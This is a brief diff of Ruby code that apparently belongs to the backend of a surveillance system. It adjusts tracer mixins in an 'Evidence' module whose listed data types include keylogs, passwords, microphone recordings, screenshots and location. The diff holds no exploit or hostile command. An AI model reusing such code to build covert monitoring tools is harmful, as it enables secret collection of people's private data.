@@ -7,8 +7,7 @@ require_relative '../shard'
 
 
 module Evidence
-  # extend RCS::Tracer
-  # include Mongoid::Document
+  extend RCS::Tracer
 
   TYPES = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
            "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]
@@ -83,6 +82,7 @@ module Evidence
     else
       c = Class.new do
         extend RCS::Tracer
+        include RCS::Tracer
         include Mongoid::Document
         include RCS::DB::Proximity
         include Evidence
